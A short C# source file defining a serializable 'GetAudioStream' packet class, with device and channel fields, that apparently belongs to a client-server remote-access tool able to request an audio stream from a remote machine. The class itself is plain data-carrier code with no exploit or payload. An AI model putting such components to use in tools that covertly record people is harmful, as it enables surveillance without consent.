using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets {

    [Serializable]
    public class GetAudioStream : IPacket {

        public int Device { get; set; }
        public int Channels { get; set; }

        public GetAudioStream() {

        }

        public GetAudioStream(int device, int channels) {
            Device = device;
            Channels = channels;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
